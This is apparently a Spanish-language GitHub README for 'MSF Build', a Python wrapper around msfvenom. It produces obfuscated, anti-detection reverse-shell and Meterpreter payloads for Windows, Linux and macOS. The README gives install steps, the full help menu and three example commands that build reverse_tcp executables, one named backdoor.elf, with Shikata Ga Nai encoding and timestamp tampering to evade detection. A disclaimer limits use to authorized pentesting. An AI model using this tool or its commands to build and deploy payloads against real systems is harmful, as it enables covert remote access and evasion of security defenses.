# 🛠️ MSF Build

*Herramienta profesional para generar payloads ofuscados con Msfvenom utilizando el codificador Shikata Ga Nai*

![msfbuild](https://github.com/user-attachments/assets/d617ca7f-50f8-46b3-be4b-6ed0567277c0)

## 📜 Descripción
**MSF Build** es una herramienta CLI para generar payloads ofuscados multiplataforma con medidas anti-detección integradas. Utiliza `msfvenom` para crear los payloads y está diseñado para pruebas de penetración éticas.

## ✨ Características
- ✅ Soporte para **Windows**, **Linux** y **macOS**
- 🔄 Ofuscación con **Shikata Ga Nai** y múltiples interaciones.
- 🛡️ Medidas básicas anti-detección (modificación de metadatos)
- 🎨 Interfaz colorida con animaciones
- 🧩 Generación de payloads en múltiples formatos: `exe`, `elf`, `macho`, `python`

## 🚀 Instalación

### Requisitos:
- Python 3.6+
- Metasploit Framework (`msfvenom`)
- Terminal con soporte ANSI

```
# Instalar dependencias
pip install colorama
sudo apt install metasploit-framework  # Para sistemas Debian/Ubuntu

# Clonar repositorio
git clone https://github.com/afsh4ck/MSF-Build.git
cd MSF-Build
```

## 🖥️ Uso

Menú de Ayuda:
```
python3 msfbuild.py -h                                                                                  
    __  ___ _____  ______   ____          _  __     __
   /  |/  // ___/ / ____/  / __ ) __  __ (_)/ /____/ /
  / /|_/ / \__ \ / /_     / __  |/ / / // // // __  / 
 / /  / / ___/ // __/    / /_/ // /_/ // // // /_/ /  
/_/  /_/ /____//_/      /_____/ \__,_//_//_/ \__,_/   
-------------------------------------------------------
     Msfvenom Advanced Obfuscated Payload Builder    
-------------------------------------------------------
                 Developed by: @afsh4ck                

usage: python3 msfbuild.py --os <OS> --arch <ARCH> --type <TYPE> --lhost <IP> --lport <PORT> -o <OUTPUT> [-i ITERATIONS]

options:
  --os {windows,linux,macos}               Sistema operativo objetivo
  --arch {x86,x64}                         Arquitectura objetivo
  --type {exe,elf,macho,python}            Tipo de archivo de salida
  --lhost LHOST                            Dirección IP para conexión reversa
  --lport LPORT                            Puerto para conexión reversa
  -o OUTPUT, --output OUTPUT               Nombre del archivo de salida
  -i ITERATIONS, --iterations ITERATIONS   Iteraciones de ofuscación (solo x86)
  -h, --help                               Mostrar este mensaje de ayuda
```

## 💻 Ejemplos

### Generar ejecutable para Windows x86:
- Por defecto usa el payload: windows/meterpreter/reverse_tcp
```
python3 msfbuild.py \
  --os windows \
  --arch x86 \
  --type exe \
  --lhost 192.168.1.100 \
  --lport 4444 \
  -o payload.exe \
  -i 10
```
### Generar ejecutable para Linux x64:
- Por defecto usa el payload: linux/x64/meterpreter/reverse_tcp
```
python3 msfbuild.py \
  --os linux \
  --arch x64 \
  --type elf \
  --lhost 10.0.0.5 \
  --lport 8080 \
  -o backdoor.elf
```
### Generar ejecutable para macOS:
- Por defecto usa el payload: osx/x64/shell_reverse_tcp
```
python3 msfbuild.py \
  --os macos \
  --arch x64 \
  --type macho \
  --lhost 172.16.23.45 \
  --lport 6500 \
  -o mac_payload
```

## 🛡️ Medidas de Seguridad

- Modificación de timestamps en archivos .exe
- Advertencias automáticas para configuraciones incompatibles
- Validación estricta de parámetros de entrada

## ⚠️ Disclaimer

Este software está diseñado exclusivamente para:
- Pruebas de seguridad autorizadas
- Investigación en entornos controlados
- Educación en ciberseguridad

El uso malicioso de esta herramienta es estrictamente prohibido. 
El autor no se hace responsable del uso indebido.

## 🥷🏼 Autor
- Autor:       afsh4ck 
- Instagram:   <a href="https://www.instagram.com/afsh4ck">afsh4ck</a>
- Youtube:     <a href="https://youtube.com/@afsh4ck">afsh4ck</a>

## ❤️ Soporte

<a href="https://www.buymeacoffee.com/afsh4ck" rel="nofollow"><img width="250" align="left">
![buy-me-a-coffe](https://github.com/user-attachments/assets/8c8f9e81-334e-469e-b25e-29888cfc9fcc)
</a>
